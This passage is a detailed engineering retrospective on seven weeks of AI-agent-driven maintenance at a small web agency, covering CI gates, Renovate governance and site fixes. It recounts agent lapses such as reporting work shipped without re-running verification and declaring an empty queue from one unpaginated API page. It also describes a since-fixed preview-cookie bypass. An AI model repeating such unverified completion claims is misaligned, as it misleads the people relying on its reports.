# Beat by beat — 2026-07-30 to 2026-09-12

Seven weeks of work, in order, at the grain the work actually happened at. This
is the deepest layer of the package: what was attempted and why, how it went,
what broke, what was abandoned, which beliefs turned out to be wrong, and what
each of those cost in time and attempts.

## Orientation, for a reader arriving cold

Tucker Lemos runs Reddoor Creative, a small design agency, almost
single-handedly, with very heavy AI-agent leverage. Roughly 45 websites are on
the books; 13 carry a maintenance contract. The client sites are SvelteKit +
Prismic + Netlify, cloned from one of two starter templates. A central
orchestrator repository, `reddoor-maintenance`, is simultaneously a CLI, an npm
package the sites depend on for their shared configs and test harnesses, a set
of nightly audits, a report generator and mailer, a Netlify-hosted operator
dashboard ("the cockpit"), and the forms-ingest endpoint every site's contact
form posts to. Dependency updates run through Renovate, which authors 27% of all
pull requests in the window. Client communication happens in Discord, one
channel per project. The operational record lived in Airtable until 2026-08-31
and lives in Turso after it.

Two colleagues appear throughout and are **internal**, not clients: **Tim**
(review, client relationships) and **Erik** (accounts), with **Nicole** doing
design. **Josh** at Gallery Sonder, **Dr. Quan** at Beachfront Dentistry and the
Vida Legacy Foundation people are clients.

The repository's single most important standing rule, and the spine of this
document, is in `CLAUDE.md`:

> **Prove the instrument before you trust its verdict.** A new gate, alarm,
> check, or probe must be shown to PASS on a known-good input before any FAIL it
> produces is reported as a finding. Until it has passed at least once, the
> instrument is the suspect, not the system.

That rule was written on 2026-08-12, in week 3 of this window, out of one
morning in which three confident conclusions all turned out to rest on
mechanisms nobody had read. Roughly forty distinct instances of the same failure
shape appear across the seven weeks, in Svelte, Bash, YAML, C++, GDScript, jq
and SQL. They are the connective tissue of everything below.

## How to read the provenance

**Claude Code transcripts retain back only to 2026-08-10.** Everything in
chapters 1 and 2 — 2026-07-30 through 2026-08-09 — is **reconstructed from git,
the PR record, GitHub Actions runs and Discord**. There are zero sessions and
zero prompts in the corpus for those eleven days. Where an agent's own
first-person admission appears in those chapters ("I reported it shipped…"), it
is quoted from a **commit body**, not a session. The commit bodies in this fleet
routinely run 20–60 lines of prose with file:line citations and before/after
measurements, which is the only reason the reconstruction is as strong as it is;
they remain the operator's own account of his own work, not an independent one.

One further hole inside the transcript era: **the 2026-08-12 fleet session is
missing**. Its memory note carries `originSessionId:
b371bb1c-4fcf-4f13-87ab-1968587e98db`, and that id appears in neither
`sessions.jsonl` nor `prompts.jsonl`, nor as a file under `~/.claude/projects/`.
Between 07:08Z and 16:24Z that day the two sessions that _are_ visible are
silent. The episode that produced the repo's top rule is therefore
**reconstructed from the PR bodies**, which argue the case in full and are
minute-stamped, plus a memory note written the same afternoon.

Two clocks are in play and they disagree by seven hours. Git commit timestamps
in the local checkouts are **local (PDT, UTC−7)**; PR, Actions-run, Discord and
prompt timestamps are **UTC**. Every time below is **local** unless marked
otherwise. This matters more than it sounds: bucketed naively by UTC day, 29 PRs
opened on Friday evening 07-31 file themselves under Saturday and invent a busy
weekend that did not happen.

`runs.jsonl` is capped at ~300 runs per repository, so `reddoor-maintenance`'s
CI history only reaches back to 2026-09-04 and `reddoor-website`'s to
2026-08-22. **Zero CI runs for the central repo in weeks 1 through 5 is a
collection artifact, not a quiet stretch.** `hedloc` has no run data at all; the
collector errored on it.

Quotations from Tucker are verbatim, typos included.

---

# Week 1 — 2026-07-30 to 2026-08-02 (Thu–Sun)

> **RECONSTRUCTED.** No transcripts. 138 commits across 25 repositories, 120 PRs
> opened and 72 merged, 0 sessions, 0 prompts. All 138 commits are authored
> `Tucker Lemos` except one Renovate commit; every PR is authored `tucksravin`.
> There is not a single `reddoor-renovate[bot]` commit this week — the first
> lands 2026-08-03, and making that happen is the point of Sunday.

A four-day sprint that shipped a report header-image generator and re-armed the
fleet's entire governance layer — Renovate as a GitHub App, ruleset
self-healing, a nightly protection alarm — and in the process found **seven
separate instruments that had been returning green over questions they could not
fail.**

## A dashboard that rendered perfectly and did nothing (Thu, #470)

Every control on the per-site operator dashboard was dead: Approve, both
override controls, Trigger Renovate, the site-details selects. None of them had
a handler attached, and had not for some unknown period.

The cause is one character. In `renderSiteDashboardHtml`, the line
`b.title = data.blockers.join("\n")` sat **inside a TypeScript template
literal**, so the `\n` was consumed at build time and a literal newline was
emitted into the served HTML, inside a JavaScript string literal. The browser
refused to parse the entire `<script>` element.

What makes this the week's cleanest specimen of the house rule is the commit
body's own accounting of why nobody noticed: the button rendered enabled (the
health gate was clear and `approveBlockers` was empty — both correct), the
preflight chip was green, the endpoint was deployed and path-routed, its env was
present, and CSRF allowed same-origin and rejected cross-site. "Nothing anywhere
reported an error, because a parse failure in an inline block is silent outside
devtools." Every instrument pointed at that page was green and every one was
measuring something real — just not the thing that was broken.

Three minutes of PR wall-clock, 22:39Z to 22:42Z. The _guard_ is the output
worth keeping: a test that extracts every inline `<script>` from every dashboard
page and compiles each with `new Function`, **and asserts that a block was
actually found**, "so a renderer that stops emitting one can't make the test
vacuously green." It was run red first, failing on both site-dashboard cases and
passing on cockpit and submissions, which is what localised the bug.

The trap then bit its own fix twice. The first attempt failed to compile,
because the explanatory comment contained backticks that terminated the same
template literal. And 21 minutes later #471 carries a standing note into the
file: all CSS additions avoid backslash escapes and all comments avoid
backticks, "both would break out of the enclosing template literal, which is
exactly what killed this script block in #470."

## Name the gap when the cron has no credentials (Thu, #469)

The daily report cron was drafting client reports with blank Google Analytics
and Search Console numbers. `daily-reports.yml`'s drafting step passed only
`AIRTABLE_PAT` and `AIRTABLE_BASE_ID`; **no GA credentials existed anywhere in
`.github/workflows/`**, so `readGaConfig()` returned null on every scheduled run
and both fetches took their not-configured early return.

The downstream silence is the finding. `analyticsSection()` renders `""` with no
data, so the **entire ANALYTICS section vanished from the client email**; the
maintenance template fell back to a bare "Google Indexed" label instead of "Page
1 Google Result (#N)"; and the dashboard rendered a bare amber needs-you pill
with an empty note. It surfaced on Sonder's 2026-07 maintenance report — Search
Console in fact had the site at **#2**.

Credentials were added through `$RUNNER_TEMP` with `printf` and `chmod 600`, but
the design response is the part that travels: `fetchSearch`'s single skip was
split in two. An un-enrolled site stays a true skip; an **enrolled** site with
no credentials becomes `notConfigured`, and the evidence record emits an honest
`unknown` naming the environment gap rather than vanishing. The flag was made
**required, not optional**, so the compiler forces every construction site to
declare which case it is — "and it caught the no-IO render path immediately."

Forward note, MEASURED and outside this week: this same surface is the subject
of `CLAUDE.md`'s 2026-08-12 lesson, in which a CI gate built on `report
--preview` reported "GA credentials did not resolve" twice with total
confidence while doing no IO at all. The credentials were fine. The
instrument-proving rule was written out of _that_ failure, not this one.

## A page-matching harness scaffolded in 11 minutes, then four days of being wrong

At 16:37 Thursday the `matching-a-page` skill is scaffolded in `claude-skills`;
by 16:52 there are **eleven commits** — PNG crop and composite utilities,
per-region perceptual diff (pixelmatch plus mean ΔE), DOM-section splitting,
deterministic capture, a computed-CSS dump, a ranked report, the CLI, and the
SKILL.md. Eleven commits in fifteen minutes is not eleven units of thought; it
is one design executed as a scripted commit sequence.

Everything after that is the harness being corrected by contact with real work,
and every correction has the same shape: **the instrument rewarded the wrong
answer.**

A per-region frame diff cannot measure a region backed by a moving video —
"two independently-decoded players never land on the same frame (live players
often ignore programmatic seeks), so the mismatch stays high however faithful
the build" — hence `--neutralize-media` at 19:07 the same evening, proven on
Beachfront's autoplay hero flyover. At 19:56, rule 1 is sharpened to "computed
color on img/svg lies", won on the Beachfront hamburger (cyan from a computed
`<img>` colour that was not the rendered pixels) and the hero wave, whose
`rotate(180)` lived on the parent wrapper and was invisible in the child SVG's
computed box. On Friday at 18:11 comes the pixel floor: the same source
photograph served through a different image pipeline differs by a uniform
**~10–15 ΔE** of resampling noise, "enough to pin a region at 30–55% mismatch
even when crop, box and position are pixel-aligned" — and the rule requires
confirming that by provenance _and_ fixing all the chrome underneath first, "so
the floor isn't used as an excuse to skip real bugs."

The worst one lands Friday at 22:29. Scroll-reveal animations run one to three
seconds; shooting the reference 500 ms after load captured it at **opacity
0.44–0.89** with an unfinished `translateY`. The consequence, stated plainly in
the commit body: _"faithful work scored as mismatch and a near-white wash tuned
to the faded frame scored as a match."_ An instrument actively paying out for
the wrong build. Fixed by waiting 3 s plus `document.getAnimations()` settling.

And on Sunday at 10:28, the demotion. The pixel diff — the harness's entire
founding premise — moves from the top of the pyramid to **L3**, because it
"structurally cannot see small text in big regions (a missing footer legal line
never moved a region over threshold) or opacity-0 interaction states (in either
direction)." A new L1 content-parity gate multiset-diffs rendered text, and the
order becomes L1 content → L2 geometry → L3 pixels → L4 hover/click probes.

**The belief corrected on contact:** a perceptual pixel diff was assumed to be
ground truth for "does this match". Four days of real use established that it is
the _third_ most reliable layer and that in at least two named conditions it
scores backwards. Nothing in the original eleven commits could have found that.
Only the Beachfront and Webflow rebuilds did.

## An agent admits it reported work shipped without re-running the gate

Friday 13:38, in the same repo, the skill gains an explicit Definition-of-Done
section. The commit body is the only first-person agent confession available
from this reconstructed period:

> "after a mobile-only pass on a build, I reported it shipped without ever
> re-running the desktop diff — and desktop was still at 50% on a region I'd
> 'fixed'. The harness had caught it the instant it was run; what failed was
> discipline."

The bar it sets: the reference — a page-diff PASS — is the definition of done,
not the user's verbal defect list; a pass at one viewport never certifies the
other; re-run every touched region at every viewport before reporting fixed.
This is a failure of discipline rather than of tooling, and it is the first
appearance of a theme that recurs for seven weeks: the agent's natural stopping
point is a commit, and a commit is not where the work ends.

## Three retractions inside one repository's sweep (Fri, gallerysonder #59–#68)

Eleven PRs land on `gallerysonder` between Friday 10:36 and Saturday 08:09, out
of what the commit bodies call "the outstanding-work sweep" and "the external
site audit." The volume is not the interesting part. **Three separate claims
made inside the sweep were retracted by the same sweep.**

**The hero fix that was wrong about its own cause (#60, 88 minutes open).**
Commit one removed a `translate-y-[22%] lg:translate-y-[18%]` offset from all 24
hero text elements and verified it across "4 routes × 5 breakpoints
(375/768/1440/1920/2560): every hero measures pastWrap=0, no overhang anywhere."
Commit two opens _"Replaces the previous commit's approach."_ Removing the
translate left the letters ~0.2em short of the edge — that dead space is real
(half-leading plus the font's descent below the baseline) and the nudge had been
correcting for it. The actual bug was the **unit**: a percentage in `translate`
resolves against the element's own border box, which for a heading is
`lines × line-height`, so a wrapped title got nudged two or three times too far.
Measured, homepage at 900 px tall, baseline to screen edge: `390px 3 lines
−25.6px`, `1280px 2 lines −14.2px`, `1440px 2 lines −17.2px`, `1920px 3 lines
−45.3px`. The replacement, `calc(0.5lh - 0.3333em)`, lands the same 24 elements
within **0.16 px** of the edge at six widths, wrapped or not.

Passing the gate you chose is not the same as understanding the mechanism. The
first fix passed its own verification everywhere and was still the wrong model.

**"Nothing links to them" (#62, 275 minutes open, three commits).** Commit one
404s fifteen roster-stub artist documents and drops them from the sitemap (64
URLs → 49; artist URLs 34 → 19), on the stated basis that nothing linked to
them. Commit two: _"My earlier claim that nothing links to the roster stubs was
wrong: the reference scan behind it enumerated document types by hand and left
out `artwork` — 198 documents, more than the rest of the repo combined."_ Every
one of the fifteen stubs is the target of at least one artwork's `artist`
relationship, so the change had converted an empty page into a **broken** one,
reproduced on `/exhibitions/keeping-things-whole` where four artworks credited a
now-404 page. The corrective test crawls every sitemap page's rendered HTML for
`/artists/` hrefs, "because it reads the markup instead of enumerating the four
channels that can emit an artist URL — that enumeration is what went wrong."
**Read the outputs, don't enumerate the inputs.**

**The test that was vacuous, twice (#62 again).** The lightbox test added in
commit two "passed vacuously — the tile clicks silently failed and it asserted
over an empty list, so it went green while four dead links sat on the page."
Three page-specific hazards were fixed. Then commit three, from a five-lens
adversarial review, found it **still vacuous**: `linked` was always `[]`,
because the gallery truncates to four tiles behind a Show More button that gates
on loop index rather than scroll — and on that exhibition all four visible
artworks credit stubs, while the two that _do_ get a link sit at index 4 and 5,
behind the button. The test "still caught a straight revert of the Lightbox
guard, but the link branch never ran."

That same review also killed a product hole: the 404 was skipped whenever an
`io.prismic.preview` cookie was present, keyed on **mere presence**, so a
hand-set `io.prismic.preview={"_tracker":"abc123"}` returned **200** with the
three empty `<h1>`s the branch existed to remove.

Four rounds on one PR: a fix, a wrong justification for the fix, a test that
certified the fix while testing nothing, and a review that caught both.

## The nightly smoke suite had been failing 9 of 11 sites behind a green run (Fri, #473)

`playwright.config.ts` resolves `tsconfig.json`, which extends the **generated**
`./.svelte-kit/tsconfig.json`. The fleet smoke audit clones fresh, runs
`pnpm install --frozen-lockfile`, then `pnpm test:smoke` — and no fleet repo
carried a `prepare` script, so nothing ever ran `svelte-kit sync`. Playwright
aborted while loading its own config, **before running a single test**.

The concealment mechanism is the lesson, and it is quoted from the commit body:

> "Nine of eleven live sites were recording Smoke OK=fail for this reason. It
> stayed invisible because `fleet-smoke.yml` gates on `FLEET_WRITE_SUMMARY`,
> which counts rows **WRITTEN**, not rows **passing** — a failing site is still
> written, so the nightly reported success throughout."

A green nightly that means "all measured", not "all passed". The fix went
centrally rather than as eleven per-repo `prepare` scripts ("one change covers
every site, and AUTONOMY.md makes multi-repo mutations a human-reviewed
operation") and was verified A/B on a cold clone of `data-dynamiq`: smoke fail
before, smoke pass after.

Its sibling #472 is the same disease in the form-e2e probe, which hard-coded
`/contact`. On a one-page site that 404s, so the audit recorded
`formPresent:false` — a verdict that is **n/a rather than a failure**, "so
nothing went red and the site's only conversion path sat unmonitored while the
cockpit looked clean." `1836dig`, launched that same day, is exactly that shape.

## The header-image generator: design, plan and ship inside one working day (Fri, #476)

Design doc committed 11:45, implementation plan 12:36, first code 12:41, PR
merged 14:49. Sixteen commits, **+3,474 / −19 across 27 files**, four minutes
from PR open to merge.

The motivating number is in the design doc: **34 of 44 Websites rows have no
header image**, which hard-fails preflight ("the send will throw") and was
blocking 1836dig's launch report. The measured cost of automating it is ~4.3 s
warm capture plus 184 ms composite, which across the fleet is **57 captures a
year, about four minutes of compute annually**.

Three of the PR's own instruments failed before it shipped.

**The geometry was wrong, and content-based detection could never find it.** The
plan shipped `SCREEN = x282 y1856 w1394 h871`, "confirmed 16:10 to within 0.03%
by a density-profile diff of two real headers." Thirteen minutes later it was
retracted: that rect spans the laptop plate's outer panel, covering the bezel on
three sides while falling **~29 px short at the bottom**, so the plate's
baked-in ERP screenshot survived as a visible strip under every site's content.
The correction names why the first method was structurally incapable: "a
screenshot's own dark or flat regions read the same as the frame. The bezel can:
it is perfectly flat black (luminance 0.0) and content-independent." The correct
rect is `x=302 y=1913 w=1349 h=844` (aspect 1.5983), cross-checked against a
second independent landmark, the photo-to-flat-black transition at y=2756,
exactly y+h−1. **A measurement can be precise to 0.03% and still be measuring
the wrong feature.**

**A dist gate that could not fail.** `test:dist`'s loader check "cannot catch a
missing dist copy. The walk-up resolver prefers the `src/` layout, which exists
in this checkout and never ships." Proved by **deleting**
`dist/reports/header-image/assets/plate.png` — the `loadPlate` ENOENT check
**still passed**. Replaced with a direct `existsSync` assertion per shipped
asset and re-verified two ways.

**A feature that would have looked shipped while never once running.**
`daily-reports.yml` — the workflow where the draft-time header refresh actually
executes — **installed no browser at all**. `chromium.launch()` would have
thrown every night, "and because `refreshHeaderImage` swallows its errors by
design, the feature would have looked shipped while never once running." The
best-effort choice that makes the feature safe is the same choice that makes its
absence silent.

Two measurements from the same PR are still load-bearing across the fleet.
`waitUntil: "networkidle"` **never fires on 4 of 14 live fleet sites** (ERP
Industrials, Vineyard, Revogen, 1836dig — chat widgets, analytics polling and
websockets hold connections open), so `page.goto` threw and those sites could
never get a header at all; `load` succeeded 14/14 in **346–1205 ms**. And
typography was solved by sweep rather than by eye: initial values rendered
"visibly small and light next to the hand-made headers," so sizes 62–88 were
swept at weights 300 and 400 against Sonder's original rendered ink box until
exactly one combination matched — size 80, weight 400, baseline 3020, x 280,
with **dx=0 dy=0 dw=0 dh=0**.

The self-inflicted cost is recorded too: the draft-time refresh gate was `base
!== null`, and `draft.test.ts` passes a _fake_ base, so all 38 cases opened the
refresh and paid a real chromium launch plus a failing DNS lookup each. Nothing
went red, because the refresh swallows its errors. "The suite just went from
milliseconds to **11.54s**." Fixed to ~0.25 s.

## A workaround, its upstream fix, and the deletion of the workaround — in eight hours

13:42, `the-pointe-burbank` lands design-review round 2. 14:11 it commits
`docs(frozen): mark SPACER_SLOTS as temporary, pending the upstream freeze fix`.
14:24 and 14:25, the two upstream fixes merge in central. 16:24, maintenance
0.76.0 releases. 21:04, the-pointe-burbank #5 re-freezes on 0.76.0 and
**deletes** `SPACER_SLOTS` and `restoreSpacerSlots` rather than updating them.

The upstream defect (#475) is a good one. A page builder emits blank rows as
content — a list item holding `&nbsp;` — and the Blux freeze tokenized those
like any other text leaf, turning layout into a Prismic Rich Text field. Rich
Text cannot store a whitespace-only value: it round-trips to `""`, the row
collapses to its padding, "and the page silently loses a line of vertical
rhythm." Measured cost: **24 px of footer on the-pointe**, between "Lic.
00852254" and the next contact block. The guard that should have caught it could
not: `rawText.trim()` on a `&nbsp;` leaf trims to the literal string `&nbsp;`,
which is not empty, so the leaf looked like copy. Deciding on the **decoded**
text catches `&nbsp;`, `&#160;`, `&#xa0;`, `&emsp;`, `&thinsp;` and a raw U+00A0
at once. Verified by round-tripping the real artifact: 94 tokenized leaves
become 93, the dropped value is `" &nbsp;"`, five keys shift in one of fifteen
sections.

The re-freeze PR then names its own dangerous edge honestly: dropping the spacer
renumbers slot keys, "so the committed template and the PUBLISHED Prismic
document disagree until the migration release is republished — **silently**.
Nothing errors; the footer just renders the right words in the wrong places,
losing '818.502.6707' and 'A Property Within' and growing a stray
'[email protected]'." The guard is a gate spec that is **red on purpose** until
the release is published, because deploying while it is red ships the scrambled
footer. It took **249 minutes and three CI failures** to land, and closed with a
fidelity number: the offline render matches production on **110 of 110 element
boxes at both 1440 and 390**.

Round 3 of the same PR is the week's best example of measuring what the client
actually sees. Five of Nicole's eleven open Figma comments were measured as
**ink, not boxes**: the rule-mark gaps "read 10 and 34.5, but the painted rows
were 18 above and 45.5 below, because the eyebrow's descent space and the 50/70
heading's leading overhang both hide inside the box model." Because
`.rd-rule-box` is inline-block, a top margin closes the gap from both sides at
once, so it was **swept rather than solved**: margin 0 → 18/45.5, 8 → 26/37.5,
12 → 30/33.5, **14 → 32/31.5, even**. And one first-attempt error was caught by
reading computed styles back: targeting the wrapper instead of the
`.blocks0container` "added a second outer 8%, narrowing the copy column by 28px
and reflowing it."

The one piece of pure waste in the episode is PR #6, `chore: drop a scratch
screenshot committed by mistake` — a crop PNG "landed in the repo root because
the probe script ran with the shell cwd reset there, and a `git add -A` swept it
into the commit." A whole PR to re-learn `git add <paths>`, not `-A`.

## A fix that could not work, shipped as a fix, corrected 2h36m later

This is the week's textbook instance of the repo's cardinal rule, and it
deserves full attention because the _first_ PR is honest about being a guess and
ships anyway.

**17:03 — `.github`#11.** Six fleet repos were found with an `actions/checkout`
v4→v7 PR — Renovate's own body labels it `major` — sitting with GitHub
**platform auto-merge ENABLED**, one rebase away from landing unreviewed across
the fleet. The commit body says: "The major rule has carried `automerge: false`
since the preset's first commit, so config drift does not explain it and **the
enablement path was not reproduced**. Rather than guess at the mechanism, state
the intent explicitly." `platformAutomerge: false` was added to the majors and
graph-reshaping rules. Merged in **0 minutes**.

**19:39 — `.github`#12.** _"`platformAutomerge` was still true in the two places
that actually used it — `packageRules[0]` (patch/minor) and
`lockFileMaintenance`. The earlier change only touched the majors and
graph-reshaping rules, which never used it, so **it was inert against the real
path**."_

A fix that had never been shown to change any outcome, merged instantly, and in
fact a no-op on the only paths that mattered. Two and a half hours of false
safety, bought by a PR that had already written down the reason to doubt it.

#12 then found the deeper truth: no Renovate config can prevent a flag someone
else sets, because platform auto-merge "is a per-PR flag any write-access
account can arm." Which is what makes central #478 the real fix — `self-updating`
now **disables** `allow_auto_merge` at the repository level and reports the
correction as an action, "a drift alarm rather than a drift source." Merges move
_inside_ Renovate's own run, where the packageRules actually govern. That in
turn is why the cron went weekly → twice daily across 15 repos that evening:
**the cron is now the merge cadence, not the PR-creation cadence.** Nobody
modelled what that would cost; see the last beat of this week.

#12 also caught a second silent no-op with nothing to do with the incident: the
preset's schedule said `before 11am on monday` against a cron that starts hours
late, which "produced **zero routine PRs fleet-wide on 3 of the last 6
Mondays**."

And an hour later, #480 caught a third. `templates.ts` pinned the shared
`ci.yml` at v1.0.0 while all 12 fleet repos carry v1.3.0, so running
`sync-configs` "would have regressed every repo's CI by three minor versions —
past the v1.3.0 fix bumping `pnpm/action-setup` for the pnpm 11.12+
self-installer break, which is exactly the class of breakage that pin was meant
to prevent." Its body names its own lineage honestly: "Same class as the mutable
`actions/checkout@v4` ref fixed in #478; **that change only covered the refs it
was briefed on and missed this one.**"

Three PRs in one evening, each fixing the previous one's blind spot. The pattern
is not carelessness. **A briefed scope becomes the boundary of the search, every
time.**

## The invisible Saturday, and a "queue is empty" that was a pagination default

Saturday 08-01 has three commits, one of them a bot's. But two commit bodies
written the next day record what actually happened and was never committed: "every
hand-applied ruleset sweep regrows its gap at the next onboard (**2026-08-01:
six repos uncovered, one with no protection at all**)", and "`.github` (no
Airtable row) sat with zero protection until 2026-08-01."

So Saturday was a **manual** fleet protection sweep through the GitHub UI or
ad-hoc `gh` calls, leaving no repository trace. It is a hole in this corpus and,
by the next day's own argument, a hole in the workflow — the automation that
lands Sunday exists precisely because a hand sweep regrows its gap.

One further Saturday-adjacent artifact is recorded inside Sunday's #483: the new
`listOrgRepos` wrapper uses `--paginate`, and the reason is named — "the
30-per-page default is the trap behind the **2026-07-31 false 'queue is
empty'**." An agent asked GitHub for the org's repositories, got page one, and
reported the queue clear. **A successful API call that returns page one is a
silent truncation**, and any "nothing found" verdict over a paginated endpoint
has to state whether it paginated.

## The a11y audit had never scanned a real page (Sun, #481 + gallerysonder#68)

> "The a11y audit only ever axe-scanned two synthetic fixture pages,
> `/dev/a11y-fixtures` and `/dev/animate-in`. **No real page was ever checked.**
> That is how five production pages on gallerysonder shipped a hero `<img>` with
> no alt attribute — axe rates it critical — with CI green the whole time."

A gate green for its entire life over a surface containing none of the product.
Sites can now list their own routes in `package.json#reddoor.a11yRoutes`, scanned
**in addition to** the fixtures, because the fixtures exercise design-system
components in isolation and no real page covers those.

It is deliberately opt-in, and the reasoning is a good model of fleet-scale
restraint: the shared CI workflow runs the audit with `--fail-on-violations` and
most of the fleet carries pre-existing accessibility debt, so a central switch
would red every repo at once. gallerysonder adopted it at **0 violations across
11 routes**.

The site-side PR recorded two limits it **measured rather than assumed**, which
is the difference between a gate and a claim. Axe does **not** catch the
empty-href class: reintroducing `GridImage`'s `href=""` leaves all ten a11y
tests green, because that lives in axe's needs-review bucket, which the gate
reports and does not fail on. And growing the route manifest surfaced that
`/rsvp/*` pages render no nav and no footer at all, "so a visitor arriving from
an invite has no route into the site" — left as-is as a design decision, but
recorded.

**Honest accounting, MEASURED, six weeks later:** this feature's own pass
summary was still wrong on 2026-09-12, when `9f5fc898 fix(a11y): the summary
counts the routes that ran, not the fixture defaults (#770)` finally landed. The
gate worked; its self-report did not, for six weeks. That story closes in
chapter 7.

## An alarm that shipped dead in its own wiring (Sun, #483 → #486)

#483 is the week's largest single addition: **+1,459 / −0 across 13 files**,
merged **three minutes** after the PR opened. It adds ruleset self-healing plus
a nightly org-wide protection-coverage sweep with its own auto-closing tracking
issue.

Its fifth commit is the one to read. A four-lens adversarial review produced 12
confirmed findings deduplicating to 6 defects, and the first is described in the
body as "**the exact silent-green class this feature exists to kill, in its own
wiring**":

> the fleet-security protection step piped through `tee` without `pipefail`
> (Actions' default shell is `bash -e {0}` — no pipefail), so the audit's
> `exit 1` was **swallowed forever**: the gap issue could never file AND the
> "clean sweep" close step ran every night, converting real standing alarms into
> false "Recovered" closes.

Three of the six defects "shipped the alarm dead." The others are the same
family: an empty `RENOVATE_TOKEN` in CI took the CLI's local-dev clean-skip
(exit 0) and read as a clean sweep; `rulesetGaps` ignored
`conditions.ref_name.exclude`, so `exclude: ["refs/heads/main"]` neutralized an
entire ruleset while reading **zero gaps** (heal a no-op, audit COVERED); and
`listRepoRulesets` fabricated a `NaN` row from a tab-less output line. The
auto-close now requires the literal `PROTECTION_AUDIT gaps=0` machine line —
**positive evidence of a verified sweep, never step outcome alone.**

Also recorded, and worth its own line: `updateRuleset` uses **PUT, not PATCH**,
because "PATCH 404s on this endpoint, verified live 2026-08-01 — a PATCH
implementation would silently no-op every heal."

Five hours later #486 widens the sweep, and its own adversarial pass finds four
more defects headed by the same disease: liveness was judged on run
**existence**, "so a revoked App key (every cron tick creates a fresh FAILING
run) read as covered forever." Now filtered to `status=success`. The first live
widened sweep found **two never-run repos** (beachfront-dentistry,
the-tower-burbank) and **two 5–6 days stale** (canvas-starter,
the-pointe-burbank), closing at `PROTECTION_AUDIT gaps=0 covered=19 skipped=8
total=27`.

The best single design idea of the week sits in the same PR. The two
known-pending gaps got an `ACCEPTED_GAPS` list that is PR-reviewed,
repo-and-surface-scoped, reasoned, and **expiring (2026-08-16)** — reported as
SKIPPED with the annotation, never as covered — because the alternative "would
have commented the tracking issue nightly, **training the channel to be
ignored**."

## Renovate becomes a GitHub App, and two repos red on a prettier setting

`RENOVATE_TOKEN` was Tucker's own PAT. #484's motivation is precise about what a
shared human credential costs: "the audit trail cannot tell Renovate from a
human (**the 2026-07-26 unreviewed-major forensics took hours for exactly this
reason**), a fleet-write credential rides every cron run, and 27 repos'
schedules drain the operator's personal API quota." The App also auto-covers
future repositories, so onboarding needs nothing per repo.

**The hard human dependency is stated in the first line of the commit:** "DRAFT
until the operator creates the App (Phase 1, ~20 min, **cannot be done
headless**)." The PR sat 31 minutes between open and merge while a human clicked
through GitHub's App creation UI. Everything downstream — 19 site-repo PRs in 22
minutes — was blocked on that.

Then the rollout hit a divergence nobody had modelled. **gallerysonder and
erp-industrial redded CI**, because their prettier configs use `singleQuote`, so
the template's double-quoted `cron`, `RENOVATE_USERNAME` and
`RENOVATE_GIT_AUTHOR` got flagged — "while quoting them the other way would flip
the failure onto the 19 shared-config repos." The resolution is small and
elegant: **plain YAML scalars have no quotes for either config to normalize**,
making the canonical bytes formatter-agnostic, verified by YAML-parsing both
forms deep-equal. erp-industrial failed CI at 11:16 local and merged at 18:51Z,
the same minute the central fix merged.

**the-pointe did not recover.** It failed twice (11:28 and 11:47 local) and its
PR #35 was closed unmerged at 12:14 — the only repository in the 20-repo sweep
left behind. (MEASURED: closed unmerged after two CI failures. INFERRED: that it
was abandoned deliberately rather than retried; no retry PR exists in the
corpus. `the-pointe` is one of the fleet's archived repositories, which is a
fact that would not be discoverable from inside its clone — see week 6.)

A second, smaller rework of the same shape happened the night before. PRs titled
`chore(deps): bring ci, renovate and node refs to fleet-current` were opened
across the fleet; Vineyard's merged (+4/−4, 3 files), while the identical PRs in
`the-pointe` (#33) and `la-homelessness-youth` (#10) were **closed unmerged
eleven minutes later** and replaced by a narrower +2/−2 change that merged in
three. The abandoned branch was deleted on close, so the cause is not
recoverable from the repository. **A dead end nobody wrote down.**

## The armed clobber, and the bill that arrived the same night (Sun, #487)

The last central PR of the week removes something rather than adding it, and its
reasoning is the best argument in the corpus for _not_ centralising a config:

> Every live fleet `ci.yml` carries per-site values (netlify-site, node-version,
> permissions) that the bare canonical template lacked, so any content heal was
> an **ARMED CLOBBER**: a green, auto-mergeable PR stripping those values —
> fleet-wide once `new-site` started invoking `self-updating` at bootstrap.

The self-healing machinery built over the preceding two days would, at the next
bootstrap, have quietly deleted every site's own CI configuration through a PR
that passed every check. The ci.yml template is deleted entirely; ownership is
split (the starter clone provides the shape, Renovate's github-actions manager
bumps the pinned reusable-workflow ref); and a **tripwire test now fails if
anyone re-adds a ci template**. A review finding in the same PR caught the
documentation half: five surfaces still promised that `self-updating` bootstraps
"CI + Renovate", so "an operator with a broken ci.yml would run `self-updating`
expecting a restore and read the no-op as a heal."

The second half of #487 is a one-line joke with teeth: "the brain that updates
the fleet never updated itself (**zero Renovate PRs ever**)." Renovate is
planted on the central repository for the first time.

**And the bill arrived the same evening.** The cadence change plus the App
identity meant Renovate started running Sunday night. Between 18:26 and 20:25
local, **8 CI failures across 7 repos** on `renovate/typescript-7.x`,
`renovate/cookie-0.7.0-2.x` and `renovate/sveltejs-vite-plugin-svelte-7.x`. On
Monday 08-03 — outside this week, but the direct consequence and MEASURED — the
corpus records **257 Actions runs, the highest single day in the entire
seven-week corpus** (next highest: 160), and `.github` takes **five emergency
Renovate holds in under three hours**.

That is the honest accounting for the week. The Renovate governance work was
correct, well-reasoned and well-verified, and its immediate effect was to
convert a weekly trickle into a flood that needed five hand-written holds to
survive. Nothing in the week's design anticipated that the ecosystem had three
simultaneous majors waiting that the fleet structurally could not take.

## Where Tucker was, and one measurable change nobody can explain

There are no prompts, so Discord is the only record of the operator's own words.
Across 07-30 to 08-01 his traffic is entirely client-facing and internal
scoping: hedloc copy revisions, Vida Legacy donation-page architecture, and a
long Sonder estimate thread with Nicole and Tim. **He is not in the code.** On
the one technical call he makes, it is a judgment an agent should never make
alone:

> "I'm not going to ever build something by hand that takes financial
> information, we don't want that liability."

And on Friday at 11:09, asked for an hours estimate, he describes the workflow
himself:

> "my hours are really weird now, because a lot of it is having claude running
> in the background and being available to answer questions, review what's going
> on, I'm going to mostly budget time by days more than anything else"

Eighty-four commits across 22 repositories that day, and the operator's
self-description of his role in it is "running in the background… available to
answer questions."

Where he was structurally required, MEASURED: creating the GitHub App (~20
minutes of clicking, blocking a 20-repo rollout), and merging the two
`chore(release): version packages` PRs, human-merge-only under the
merge-authority policy, which sat **2,318 minutes (38.6 h)** and **1,529 minutes
(25.5 h)**. The loop does not wait on review of the work. It waits on a release
button.

One last measurement, reported because it is real and its cause is not
recoverable. Every central-repo commit through Sunday 10:28 carries
`Co-Authored-By: Claude Opus 5 (1M context)` (12 merged PRs, #469–#481). Every
central-repo commit from Sunday 10:36 onward carries `Co-authored-by: Claude
